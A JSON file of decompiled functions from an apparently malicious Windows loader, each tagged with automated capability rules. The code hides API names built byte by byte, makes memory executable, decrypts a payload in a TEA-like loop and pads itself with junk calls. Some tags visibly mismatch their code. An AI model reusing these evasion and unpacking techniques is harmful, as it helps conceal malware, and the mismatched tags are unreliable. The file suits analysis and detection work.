{
    "00408df0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00408df0(void)\n\n{\n    *0x43ef88 = 0x6d;\n    *0x43ef89 = 0x73;\n    *0x43ef8a = 0x69;\n    *0x43ef8b = 0x6d;\n    *0x43ef8c = 0x67;\n    *0x43ef8d = 0x33;\n    *0x43ef8e = 0x32;\n    *0x43ef8f = 0x2e;\n    *0x43ef90 = 100;\n    *0x43ef91 = 0x6c;\n    *0x43ef92 = 0x6c;\n    *0x43ef93 = 0;\n    return;\n}\n",
        "token_count": 179
    },
    "004091a6": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.004091a6(void)\n\n{\n    uint var_4h;\n    \n    *0x43ef8e = 0x33;\n    *0x43ef8f = 0x32;\n    *0x43ef93 = 0x6c;\n    *0x43ef8b = 0x6e;\n    *0x43ef88 = 0x6b;\n    *0x43ef8c = 0x65;\n    *0x43ef8d = 0x6c;\n    *0x43ef89 = 0x65;\n    *0x43ef8a = 0x72;\n    *0x43ef90 = 0x2e;\n    *0x43ef91 = 100;\n    *0x43ef92 = 0x6c;\n    *0x43ef94 = 0;\n    *0x7dde18 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x43ef88);\n    *0x43ef8f = 0x50;\n    *0x43ef8d = 0x61;\n    *0x43ef91 = 0x6f;\n    *0x43ef95 = 0x74;\n    *0x43ef88 = 0x56;\n    *0x43ef96 = 0;\n    *0x43ef93 = 0x65;\n    *0x43ef89 = 0x69;\n    *0x43ef8c = 0x75;\n    *0x43ef8e = 0x6c;\n    *0x43ef94 = 99;\n    *0x43ef8b = 0x74;\n    *0x43ef92 = 0x74;\n    *0x43ef8a = 0x72;\n    *0x43ef90 = 0x72;\n    *0x43ef84 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x7dde18, 0x43ef88);\n    (**0x43ef84)(*0x7da318, *0x7dde1c, 0x40, &var_4h);\n    return;\n}\n",
        "token_count": 492
    },
    "004092a5": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfCharsWritten\n// WARNING: Variable defined which should be unmapped: pActCtx\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: lpdwSize\n// WARNING: Variable defined which should be unmapped: lpValue\n// WARNING: Variable defined which should be unmapped: lpFilePart\n\nuint fcn.004092a5(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t unaff_EBX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    code *unaff_EDI;\n    uint auStackY9868 [512];\n    uint lpBuffer;\n    uint lpConsoleTitle;\n    uint lpDestStr;\n    uint var_e88h;\n    uint lpCalData;\n    uint lpszVolumeName;\n    uint lpCPInfoEx;\n    uint var_184h;\n    uint uStackY288;\n    uint uStackY284;\n    uint uStackY280;\n    uint uStackY276;\n    uint uStackY272;\n    uint uStackY268;\n    uint lpVersionInformation;\n    uint *puStackY260;\n    uint *puStackY256;\n    uint *puStackY252;\n    uint uStackY248;\n    uint uStackY244;\n    uint uStackY240;\n    uint uStackY236;\n    uint uStackY232;\n    uint uStackY228;\n    uint *puStackY224;\n    uint *puStackY220;\n    uint *puStackY216;\n    uint uStackY212;\n    uint *puStackY208;\n    uint uStackY204;\n    uint *puStackY200;\n    uint uStackY196;\n    uint uStackY192;\n    uint uStackY188;\n    uint *puStackY184;\n    uint *puStackY180;\n    uint uStackY176;\n    uint *puStackY172;\n    uint *puStackY168;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint *puStackY152;\n    uint uStackY148;\n    uint uStackY144;\n    uint *puStackY140;\n    uint uStackY136;\n    uint uStackY132;\n    uint *puStackY128;\n    uint *puStackY124;\n    uint uStackY120;\n    uint uStackY116;\n    uint *puStackY112;\n    uint lpCriticalSection;\n    uint uStackY104;\n    uint uStackY100;\n    uint uStackY96;\n    uint *puStackY92;\n    uint uStackY88;\n    uint *ReturnedData;\n    uchar *puStackY80;\n    uint *puStackY76;\n    uint lpCC;\n    uint *var_40h;\n    uint uStackY64;\n    uint *puStackY60;\n    uint *pActCtx;\n    uint *var_2ch;\n    uint *lpNumberOfCharsWritten;\n    uint lpFilePart;\n    uint lpValue;\n    int32_t lpdwSize;\n    \n    lpdwSize = 0x4092b2;\n    fcn.00409f00();\n    uVar3 = 0;\n    lpdwSize = unaff_EBX;\n    do {\n        if (uVar3 < 0x4e5ff3) {\n            lpNumberOfCharsWritten = 0x4092c7;\n            (*_sym.imp.USER32.dll_GetMessageTime)();\n            lpNumberOfCharsWritten = NULL;\n            (*_sym.imp.KERNEL32.dll_SetLastError)();\n            (*_sym.imp.GDI32.dll_GetBoundsRect)();\n            (*_sym.imp.GDI32.dll_SelectObject)();\n        }\n        if (*0x7dde1c == 0x6b) {\n            lpNumberOfCharsWritten = 0x30;\n            lpCC = 0;\n            fcn.0040a490();\n            lpNumberOfCharsWritten = &fcn.004092a5::lpdwSize;\n            (*_sym.imp.KERNEL32.dll_GetDefaultCommConfigA)();\n            (*_sym.imp.KERNEL32.dll_GetProfileSectionW)();\n        }\n        if (((0x1b7f5561 < uVar3) && (lpdwSize != 0xad5cf7)) && (var_2ch != 0xad4c41c)) break;\n        uVar3 = uVar3 + 1;\n    } while ((uVar3 >> 0x1f < 0x6a) || ((uVar3 >> 0x1f < 0x6b && (uVar3 < 0x43cec663))));\n    if (*0x7dde1c == 3) {\n        lpNumberOfCharsWritten = NULL;\n        fcn.0040a470(0);\n        lpNumberOfCharsWritten = 0x401510;\n        fcn.0040a430(0x401510);\n        fcn.0040a1b0(0, 0);\n        fcn.0040a180(0);\n        fcn.0040a1b0(0, 0);\n        var_2ch = 0x40937d;\n        fcn.0040a180(0);\n        var_2ch = NULL;\n        pActCtx = NULL;\n        puStackY60 = 0x409385;\n        fcn.00409f30(0, 0, 0);\n    }\n    iVar4 = 0;\n    do {\n        if (iVar4 == 0x41c) {\n            *0x7dde1c = *0x7dde1c + 0x38d6;\n        }\n        if (*0x7dde1c == 0x78) {\n            lpNumberOfCharsWritten = NULL;\n            (*_sym.imp.KERNEL32.dll_GetFileType)();\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x40b7c8);\n    lpNumberOfCharsWritten = *0x7dde1c;\n    *0x7da318 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    uVar3 = 0;\n    if (*0x7dde1c != 0) {\n        do {\n            if (*0x7dde1c == 0xfe) {\n                var_2ch = 0x4093f1;\n                (*_sym.imp.KERNEL32.dll_FoldStringW)();\n            }\n            fcn.004090b1(uVar3);\n            if (*0x7dde1c == 0xc66) {\n                (*_sym.imp.KERNEL32.dll_UnregisterWait)();\n                (*_sym.imp.KERNEL32.dll_SetConsoleCursorInfo)();\n                var_2ch = NULL;\n                pActCtx = NULL;\n                puStackY60 = 0x409424;\n                (*_sym.imp.KERNEL32.dll_FindActCtxSectionStringW)();\n                puStackY60 = &fcn.004092a5::lpdwSize;\n                uStackY64 = 0x40942e;\n                (*_sym.imp.KERNEL32.dll_InterlockedIncrement)();\n                uStackY64 = 0;\n                var_40h = 0x40155c;\n                lpCC = 0x401590;\n                puStackY76 = NULL;\n                puStackY80 = 0x409440;\n                (*_sym.imp.KERNEL32.dll_FindResourceExW)();\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *0x7dde1c);\n    }\n    iVar4 = 0;\n    do {\n        if (*0x7dde1c == 0x37) {\n            (*_sym.imp.KERNEL32.dll_GetNumberOfConsoleInputEvents)();\n            var_2ch = 0x40947e;\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)();\n            var_2ch = NULL;\n            pActCtx = &fcn.004092a5::lpdwSize;\n            (*_sym.imp.KERNEL32.dll_InterlockedExchange)();\n            puStackY60 = NULL;\n            uStackY64 = 0;\n            var_40h = 0x409492;\n            (*_sym.imp.KERNEL32.dll_CreateFiber)();\n            var_40h = NULL;\n            lpCC = 0;\n            puStackY76 = NULL;\n            puStackY80 = NULL;\n            ReturnedData = &fcn.004092a5::lpConsoleTitle;\n            uStackY88 = 0x4094a3;\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructA)();\n            uStackY88 = 0;\n            puStackY92 = NULL;\n            uStackY96 = 0;\n            uStackY100 = 0;\n            uStackY104 = 0x4094ad;\n            (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)();\n            uStackY104 = 0;\n            lpCriticalSection = 0;\n            puStackY112 = NULL;\n            uStackY116 = 0x4094b6;\n            (*_sym.imp.KERNEL32.dll_InterlockedCompareExchange)();\n            uStackY116 = 0;\n            uStackY120 = 0;\n            puStackY124 = NULL;\n            puStackY128 = &fcn.004092a5::lpVersionInformation;\n            uStackY132 = 0x4094c6;\n            (*_sym.imp.KERNEL32.dll_VerifyVersionInfoA)();\n            uStackY132 = 0;\n            uStackY136 = 0;\n            puStackY140 = &fcn.004092a5::lpDestStr;\n            uStackY144 = 0;\n            uStackY148 = 0;\n            puStackY152 = NULL;\n            uStackY156 = 0;\n            uStackY160 = 0x4094d9;\n            (*_sym.imp.KERNEL32.dll_FormatMessageW)();\n            uStackY160 = 0;\n            uStackY164 = 0;\n            puStackY168 = NULL;\n            puStackY172 = 0x4094e2;\n            (*_sym.imp.KERNEL32.dll_FindResourceW)();\n            puStackY172 = NULL;\n            uStackY176 = 0;\n            puStackY180 = 0x4094ea;\n            (*_sym.imp.KERNEL32.dll_GetProcessShutdownParameters)();\n            puStackY180 = &fcn.004092a5::lpValue;\n            puStackY184 = &fcn.004092a5::lpszVolumeName;\n            uStackY188 = 0;\n            uStackY192 = 0x4094fc;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameExA)();\n            uStackY192 = 0;\n            uStackY196 = 0;\n            puStackY200 = NULL;\n            uStackY204 = 0;\n            puStackY208 = NULL;\n            uStackY212 = 0;\n            puStackY216 = 0x409508;\n            (*_sym.imp.KERNEL32.dll_SearchPathA)();\n            puStackY216 = NULL;\n            puStackY220 = NULL;\n            puStackY224 = 0x409510;\n            (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)();\n            puStackY224 = 0x4015b0;\n            uStackY228 = 0;\n            uStackY232 = 0;\n            uStackY236 = 0x40951d;\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)();\n            uStackY236 = 0;\n            uStackY240 = 0;\n            uStackY244 = 0x409525;\n            (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n            uStackY244 = 0;\n            uStackY248 = 0;\n            puStackY252 = 0x40952d;\n            (*_sym.imp.KERNEL32.dll_EnumSystemLocalesA)();\n            puStackY252 = &fcn.004092a5::lpCriticalSection;\n            puStackY256 = 0x409537;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            puStackY256 = NULL;\n            puStackY260 = NULL;\n            lpVersionInformation = 0;\n            uStackY268 = 0;\n            uStackY272 = 0x409541;\n            (*_sym.imp.KERNEL32.dll_HeapReAlloc)();\n            uStackY272 = 0;\n            uStackY276 = 0x409548;\n            (*_sym.imp.KERNEL32.dll_ExitProcess)();\n            goto code_r0x0040954e;\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x519167);\n    lpdwSize = 0;\n    uVar3 = 0x43ef88;\n    unaff_EDI = _sym.imp.KERNEL32.dll_LoadLibraryA;\ncode_r0x0040954e:\n    do {\n        if (*0x7dde1c == 0x15a) {\n            (*unaff_EDI)();\n        }\n        if (lpdwSize == 0x76069) {\n            *0x7dde18 = (*unaff_EDI)();\n        }\n        lpdwSize = lpdwSize + 1;\n    } while (lpdwSize < 0x1756bb);\n    *0x43ef88 = 0;\n    *0x43ef84 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    lpdwSize = 0;\n    do {\n        if (lpdwSize == 0x1c) {\n            fcn.004091a6();\n        }\n        lpdwSize = lpdwSize + 1;\n    } while (lpdwSize < 0x3debc7);\n    var_2ch = 0x4095be;\n    fcn.00409048(*0x7da318, *0x7dde1c, 0x42e010);\n    lpdwSize = 0;\n    do {\n        if (*0x7dde1c == 0x10) {\n            var_2ch = &fcn.004092a5::lpValue;\n            pActCtx = 0x4095d4;\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)();\n        }\n        if (lpdwSize == 0x1e674) {\n            var_2ch = 0x4095e2;\n            fcn.00409198();\n        }\n        lpdwSize = lpdwSize + 1;\n    } while (lpdwSize < 0x3e4e2);\n    lpdwSize = 0xdd7b3;\n    do {\n        if (*0x7dde1c == 0x21) {\n            var_2ch = NULL;\n            pActCtx = NULL;\n            puStackY60 = NULL;\n            uStackY64 = 0x409608;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasA)();\n        }\n        lpdwSize = lpdwSize + -1;\n    } while (lpdwSize != 0);\n    var_2ch = 0x409612;\n    fcn.00408df0();\n    *0x43ef89 = 0x73;\n    *0x43ef8b = 0x6d;\n    *0x43ef8c = 0x67;\n    *0x43ef8a = 0x69;\n    *0x43ef92 = 0x6c;\n    *0x43ef8e = 0x32;\n    *0x43ef91 = 0x6c;\n    *0x43ef93 = 0;\n    *0x43ef8d = 0x33;\n    *0x43ef90 = 100;\n    *0x43ef88 = 0x6d;\n    *0x43ef8f = 0x2e;\n    pActCtx = 0x409668;\n    var_2ch = uVar3;\n    (*unaff_EDI)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    if (*0x7dde1c == 0x1144) {\n        pActCtx = NULL;\n        puStackY60 = NULL;\n        uStackY64 = 0x409687;\n        (*_sym.imp.KERNEL32.dll_GetCurrentConsoleFont)();\n        uStackY64 = 0;\n        var_40h = &fcn.004092a5::lpszVolumeName;\n        lpCC = 0;\n        puStackY76 = 0x409696;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeA)();\n        puStackY76 = &fcn.004092a5::lpCriticalSection;\n        puStackY80 = 0x4096a0;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n        puStackY80 = NULL;\n        ReturnedData = 0x4096a3;\n        (*pcVar1)();\n        ReturnedData = NULL;\n        uStackY88 = 0;\n        puStackY92 = &fcn.004092a5::lpBuffer;\n        uStackY96 = 0;\n        uStackY100 = 0;\n        uStackY104 = 0;\n        lpCriticalSection = 0;\n        puStackY112 = 0x4096b6;\n        (*_sym.imp.KERNEL32.dll_FormatMessageW)();\n        puStackY112 = NULL;\n        uStackY116 = 0;\n        uStackY120 = 0;\n        puStackY124 = 0x4096bf;\n        (*_sym.imp.KERNEL32.dll_FindResourceW)();\n        puStackY124 = &fcn.004092a5::pActCtx;\n        puStackY128 = 0x4096c9;\n        (*_sym.imp.KERNEL32.dll_CreateActCtxW)();\n        puStackY128 = NULL;\n        uStackY132 = 0;\n        uStackY136 = 0;\n        puStackY140 = 0x4096d2;\n        (*_sym.imp.KERNEL32.dll_CopyFileW)();\n        puStackY140 = NULL;\n        uStackY144 = 0;\n        uStackY148 = 0;\n        puStackY152 = NULL;\n        uStackY156 = 0;\n        uStackY160 = 0;\n        uStackY164 = 0x4096de;\n        (*_sym.imp.KERNEL32.dll_SearchPathW)();\n        uStackY164 = 0;\n        puStackY168 = &fcn.004092a5::lpConsoleTitle;\n        puStackY172 = 0x4096ec;\n        (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)();\n        puStackY172 = &fcn.004092a5::lpValue;\n        uStackY176 = 0;\n        puStackY180 = &fcn.004092a5::lpCalData;\n        puStackY184 = NULL;\n        uStackY188 = 0;\n        uStackY192 = 0;\n        uStackY196 = 0x409701;\n        (*_sym.imp.KERNEL32.dll_GetCalendarInfoA)();\n        uStackY196 = 0;\n        puStackY200 = NULL;\n        uStackY204 = 0;\n        puStackY208 = &fcn.004092a5::var_184h;\n        uStackY212 = 0x409711;\n        (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)();\n        uStackY212 = 0;\n        puStackY216 = 0x409718;\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n        puStackY216 = &fcn.004092a5::lpdwSize;\n        puStackY220 = 0x409722;\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)();\n        pcVar2 = _sym.imp.KERNEL32.dll_GetCommandLineA;\n        puStackY220 = 0x40972a;\n        (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        puStackY220 = &fcn.004092a5::lpFilePart;\n        puStackY224 = &fcn.004092a5::var_e88h;\n        uStackY228 = 0;\n        uStackY232 = 0;\n        uStackY236 = 0;\n        uStackY240 = 0;\n        uStackY244 = 0x40973f;\n        (*_sym.imp.KERNEL32.dll_SearchPathA)();\n        uStackY244 = 0;\n        uStackY248 = 0x409746;\n        (*_sym.imp.KERNEL32.dll_SetLastError)();\n        uStackY248 = 0;\n        puStackY252 = &stack0xffffd974;\n        puStackY256 = NULL;\n        puStackY260 = 0x409755;\n        (*_sym.imp.KERNEL32.dll_GetProfileSectionW)();\n        puStackY260 = &fcn.004092a5::lpNumberOfCharsWritten;\n        lpVersionInformation = 0;\n        uStackY268 = 0x409760;\n        (*_sym.imp.KERNEL32.dll_GetBinaryTypeA)();\n        uStackY268 = 0;\n        uStackY272 = 0;\n        uStackY276 = 0;\n        uStackY280 = 0;\n        uStackY284 = 0;\n        uStackY288 = 0x40976b;\n        (*_sym.imp.KERNEL32.dll_MoveFileWithProgressW)();\n        uStackY288 = 0x40976d;\n        (*pcVar2)();\n    }\n    if (*0x7dde1c == 0x1d) {\n        pActCtx = NULL;\n        puStackY60 = NULL;\n        uStackY64 = 0;\n        var_40h = NULL;\n        lpCC = 0x409788;\n        (*_sym.imp.KERNEL32.dll_WriteConsoleA)();\n        lpCC = 0;\n        puStackY76 = NULL;\n        puStackY80 = &stack0xffffd974;\n        ReturnedData = 0x409797;\n        (*_sym.imp.KERNEL32.dll_lstrcpynW)();\n        ReturnedData = NULL;\n        uStackY88 = 0;\n        puStackY92 = NULL;\n        uStackY96 = 0x4097a0;\n        (*_sym.imp.KERNEL32.dll_CopyFileW)();\n        uStackY96 = 0;\n        uStackY100 = 0;\n        uStackY104 = 0;\n        lpCriticalSection = 0x4097a9;\n        (*_sym.imp.KERNEL32.dll_IsProcessInJob)();\n        lpCriticalSection = 0;\n        puStackY112 = &fcn.004092a5::var_e88h;\n        uStackY116 = 0;\n        uStackY120 = 0x4097b8;\n        (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)();\n        uStackY120 = 0;\n        puStackY124 = 0x4097bf;\n        (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n        puStackY124 = NULL;\n        puStackY128 = NULL;\n        uStackY132 = 0x4097c7;\n        (*_sym.imp.KERNEL32.dll_GenerateConsoleCtrlEvent)();\n        uStackY132 = 0;\n        uStackY136 = 0;\n        puStackY140 = 0x4097cf;\n        (*_sym.imp.KERNEL32.dll_SetProcessAffinityMask)();\n        puStackY140 = 0x4015b4;\n        uStackY144 = 0x4097da;\n        (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        uStackY144 = 0;\n        uStackY148 = 0;\n        puStackY152 = 0x4097e2;\n        (*_sym.imp.KERNEL32.dll_SetThreadContext)();\n        puStackY152 = &fcn.004092a5::lpCPInfoEx;\n        uStackY156 = 0;\n        uStackY160 = 0;\n        uStackY164 = 0x4097f1;\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n        uStackY164 = 0;\n        puStackY168 = NULL;\n        puStackY172 = NULL;\n        uStackY176 = 0;\n        puStackY180 = NULL;\n        puStackY184 = 0x4097fc;\n        (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesW)();\n        puStackY184 = NULL;\n        uStackY188 = 0;\n        uStackY192 = 0x409804;\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n        uStackY192 = 0;\n        uStackY196 = 0x40980b;\n        (*_sym.imp.KERNEL32.dll_FlushConsoleInputBuffer)();\n        uStackY196 = 0;\n        puStackY200 = &fcn.004092a5::lpCalData;\n        uStackY204 = 0;\n        puStackY208 = 0x40981a;\n        (*_sym.imp.KERNEL32.dll_GetAtomNameA)();\n        puStackY208 = &fcn.004092a5::lpFilePart;\n        uStackY212 = 0x409824;\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n        uStackY212 = 0;\n        puStackY216 = NULL;\n        puStackY220 = &fcn.004092a5::lpszVolumeName;\n        puStackY224 = NULL;\n        uStackY228 = 0;\n        uStackY232 = 0x409835;\n        (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructA)();\n        uStackY232 = 0;\n        uStackY236 = 0;\n        uStackY240 = 0;\n        uStackY244 = 0;\n        uStackY248 = 0;\n        puStackY252 = 0x409840;\n        (*_sym.imp.KERNEL32.dll_UnlockFile)();\n        puStackY252 = NULL;\n        puStackY256 = &fcn.004092a5::lpValue;\n        puStackY260 = NULL;\n        lpVersionInformation = 0;\n        uStackY268 = 0x40984d;\n        (*_sym.imp.KERNEL32.dll_GetTapeParameters)();\n        uStackY268 = 0;\n        uStackY272 = 0;\n        uStackY276 = 0x409855;\n        (*_sym.imp.KERNEL32.dll_VirtualLock)();\n        uStackY276 = 0;\n        uStackY280 = 0x409858;\n        (*pcVar1)();\n    }\n    pActCtx = 0x40985d;\n    fcn.00409192();\n    return 0;\n}\n",
        "token_count": 5845
    },
    "00408e93": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e93(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    *arg_8h = *arg_8h ^ arg_ch;\n    return;\n}\n",
        "token_count": 55
    },
    "00408ee1": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ee1(uint32_t *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    *arg_8h = arg_10h >> 5;\n    *arg_8h = (arg_10h >> 5) + arg_ch;\n    return;\n}\n",
        "token_count": 74
    },
    "00408f04": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408f04(uint32_t *arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint32_t unaff_ESI;\n    int32_t iVar3;\n    uint lpVolumeNameBuffer;\n    uint var_830h;\n    uint uStackY60;\n    uint uStackY56;\n    uint *var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0x408f11;\n    fcn.00409f00();\n    puVar1 = arg_8h;\n    var_1ch = arg_ch[1];\n    var_4h = *arg_8h;\n    var_18h = arg_ch[2];\n    var_24h = arg_ch[3];\n    iVar3 = -0x3910c8e0;\n    var_ch = 0x20;\n    var_8h = unaff_ESI;\n    do {\n        uVar2 = var_4h;\n        arg_8h = var_4h << 4;\n        if (*0x7dde1c == 5) {\n            var_10h = 0;\n            var_14h = 0x408f6d;\n            (*_sym.imp.KERNEL32.dll_FindNextChangeNotification)();\n        }\n        arg_8h = arg_8h + var_18h ^ iVar3 + uVar2;\n        *0x7da31c = (uVar2 >> 5) + var_24h ^ arg_8h;\n        var_14h = &fcn.00408f04::var_8h;\n        var_18h = 0x408fa3;\n        var_20h = *0x7da31c;\n        var_10h = *0x7da31c;\n        fcn.00408e54(var_14h, *0x7da31c);\n        uVar2 = var_8h;\n        arg_8h = var_8h << 4;\n        if (*0x7dde1c == 0x78c) {\n            var_1ch = &fcn.00408f04::var_830h;\n            var_20h = &fcn.00408f04::var_28h;\n            var_24h = &fcn.00408f04::var_30h;\n            var_28h = &fcn.00408f04::var_2ch;\n            var_30h = &fcn.00408f04::lpVolumeNameBuffer;\n            uStackY56 = 0x401300;\n            uStackY60 = 0x408fe1;\n            var_2ch = extraout_EDX;\n            var_18h = extraout_EDX;\n            (*_sym.imp.KERNEL32.dll_GetVolumeInformationW)();\n        }\n        arg_8h = arg_8h + var_10h;\n        *0x7da324 = 0xffffffff;\n        var_18h = iVar3 + uVar2;\n        var_1ch = &fcn.00408f04::arg_8h;\n        *0x7da320 = 0xff6b3619;\n        var_20h = 0x40900d;\n        fcn.00408e93(var_1ch, var_18h);\n        var_24h = &fcn.00408f04::arg_8h;\n        var_28h = 0x409017;\n        var_20h = arg_ch_00;\n        fcn.00408e93(var_24h, arg_ch_00);\n        var_28h = arg_8h;\n        var_ch = &fcn.00408f04::var_4h;\n        var_30h = 0x409023;\n        fcn.00408e63(var_ch, arg_8h);\n        arg_ch = var_14h;\n        iVar3 = iVar3 - var_14h;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    puVar1[1] = uVar2;\n    *puVar1 = var_4h;\n    return;\n}\n",
        "token_count": 1153
    },
    "00409048": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409048(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    if (*0x7dde1c == 0x516) {\n        (*_sym.imp.KERNEL32.dll_MoveFileWithProgressA)(0x4013c0, 0x4013a8, 0, 0, 0);\n    }\n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x7dde1c == 0x29) {\n            (*_sym.imp.KERNEL32.dll_CopyFileExW)(0x401424, 0x4013e0, 0, 0, 0, 0);\n        }\n        fcn.00408f04(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0040aac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040aac0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0040ab20(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4h);\n    if ((iVar1 == 0) && (var_4h != 0)) {\n        iVar2 = fcn.00410690();\n        if (iVar2 != 0) {\n            piVar3 = fcn.00410690();\n            *piVar3 = var_4h;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 205
    },
    "0040b010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b010(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0040af40(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4h);\n    if ((iVar1 == 0) && (var_4h != 0)) {\n        iVar2 = fcn.00410690();\n        if (iVar2 != 0) {\n            piVar3 = fcn.00410690();\n            *piVar3 = var_4h;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 205
    },
    "00414d08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414d08(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t unaff_EBP;\n    \n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00414dd0();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00418c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
